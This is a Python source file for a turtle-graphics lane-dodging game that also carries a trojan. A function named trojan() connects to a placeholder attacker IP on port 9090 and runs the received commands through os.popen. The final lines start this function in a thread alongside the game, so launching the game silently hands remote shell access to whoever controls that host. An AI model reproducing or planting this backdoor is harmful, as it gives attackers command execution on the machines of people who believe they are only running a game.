from turtle import *
from random import randrange
from tkinter import *
import socket
import threading
import os


class freeway_game():
    def __init__(self, n):
        self.finished = False
        self.xn = Screen()
        self.xn.title('Turtle freeway')
        self.drawscreen()
        self.population_left = [Turtle() for _ in range(n)]
        last_left = None
        for ele in self.population_left:
            ele.shape("turtle")
        self.population_right = [Turtle() for _ in range(n)]
        for ele in self.population_right:
            ele.shape("turtle")
        last_right = None
        for ele in self.population_left:
            ele.penup()
            ele.right(90)
            ele.speed(10)
            ele.goto(-randrange(25, 276, 50), randrange(600)-300)
            ele.pendown()
        for ele in self.population_right:
            ele.penup()
            ele.left(90)
            ele.speed(10)
            ele.goto(randrange(25, 276, 50), randrange(600)-300)
            ele.pendown()
        self.player = Turtle()
        self.player.penup()
        self.player.left(90)
        self.player.goto(randrange(25, 575, 50) -300, -200)
        self.player.color("red")
        self.player.shape("turtle")
        self.player.pendown()
        self.xn.listen()
        self.xn.onkey(self.left, 'Left')
        self.xn.onkey(self.right, 'Right')
        self.xn.onkey(self.up, 'Up')
        self.xn.onkey(self.down, 'Down')
        while self.check_colision():
            self.player.penup()
            self.player.goto(randrange(25, 575, 50) - 300, -200)
            self.player.pendown()
        while not self.finished:
            for ele in self.population_left:
                ele.penup()
                ele.forward(10)
                ele.pendown()
                if ele.position()[1] < -295:
                    ele.penup()
                    temp = -randrange(25, 276, 50)
                    while temp == last_left:
                        temp = -randrange(25, 276, 50)
                    last_left = temp
                    ele.goto(last_left, 300)
                    ele.pendown()
                if ele.position()[0] == self.player.position()[0] and abs(self.player.position()[1] - ele.position()[1])<15:
                    self.alert_popup()
                    self.finished = True
            for ele in self.population_right:
                ele.penup()
                ele.forward(10)
                ele.pendown()
                if ele.position()[1] > 295:
                    ele.penup()
                    temp = randrange(25, 276, 50)
                    while temp == last_right:
                        temp = randrange(25, 276, 50)
                    last_right = temp
                    ele.goto(last_right, -300)
                    ele.pendown()
                if ele.position()[0] == self.player.position()[0] and abs(self.player.position()[1] - ele.position()[1])<15:
                    self.alert_popup()
                    self.finished = True
        self.xn.exitonclick()



    def left(self):
        if self.player.position()[0] != -275:
            self.player.penup()
            self.player.goto(self.player.position()[0]-50, self.player.position()[1])
            self.player.pendown()
            if self.check_colision():
                self.alert_popup()
                self.finished = True

    def right(self):
        if self.player.position()[0] != 275:
            self.player.penup()
            self.player.goto(self.player.position()[0] + 50, self.player.position()[1])
            self.player.pendown()
            if self.check_colision():
                self.alert_popup()
                self.finished = True
    def up(self):
        if self.player.position()[1] + 15 < 295:
            self.player.penup()
            self.player.goto(self.player.position()[0], self.player.position()[1] + 15)
            self.player.pendown()
            if self.check_colision():
                self.alert_popup()
                self.finished = True
    def down(self):
        if self.player.position()[1] - 15 > -300:
            self.player.penup()
            self.player.goto(self.player.position()[0], self.player.position()[1] - 15)
            self.player.pendown()
            if self.check_colision():
                self.alert_popup()
                self.finished = True

    def check_colision(self):
        State = False
        for ele in self.population_left:
            if ele.position()[0] == self.player.position()[0] and abs(
                    self.player.position()[1] - ele.position()[1]) < 15:
                State = True
        for ele in self.population_right:
            if ele.position()[0] == self.player.position()[0] and abs(
                    self.player.position()[1] - ele.position()[1]) < 15:
                State = True
        return State

    def alert_popup(self, title="YOU LOST"):
        root = Tk()
        root.title(title)
        w = 400
        h = 200
        sw = root.winfo_screenwidth()
        sh = root.winfo_screenheight()
        x = (sw - w) / 2
        y = (sh - h) / 2
        root.geometry('%dx%d+%d+%d' % (w, h, x, y))
        m = f"Your turtle was crashed :/"
        m += '\n'
        w = Label(root, text=m, width=120, height=10)
        w.pack()
        b = Button(root, text="OK", command=root.destroy, width=10)
        b.pack()
        mainloop()

    def drawscreen(self):
        way = Turtle()
        way.hideturtle()
        way.penup()
        way.goto(-300, -310)
        way.pendown()
        way.speed(10)
        way.forward(600)
        way.left(90)
        way.forward(610)
        way.left(90)
        way.forward(600)
        way.left(90)
        way.forward(610)
        midline = Turtle()
        midline.hideturtle()
        midline.speed(10)
        midline.penup()
        midline.goto(0, 300)
        midline.pendown()
        midline.right(90)
        midline.forward(600)
        for i in range(50, 600, 50):
            if i != 300:
                midline.penup()
                midline.goto(-300 + i, 290)
                midline.pendown()
                while midline.position()[1] > -290:
                    midline.forward(20)
                    midline.penup()
                    midline.forward(10)
                    midline.pendown()

def trojan():
    HOST = '000.000.000.00' #Your IP address, get from cmd with command line: ipconfig
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False
    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "cmdon":
            cmd_mode = True
            client.send("you have now terminal access".encode('utf-8'))
            continue
        if server_command =="cmdoff":
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        elif server_command == "quit_exploit":
            break
        else:
            if server_command == "fool":
                print("You've been fooled")


        client.send(f"{server_command} was successfully executed!".encode('utf-8'))


def game():
    c = freeway_game(10)


t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()
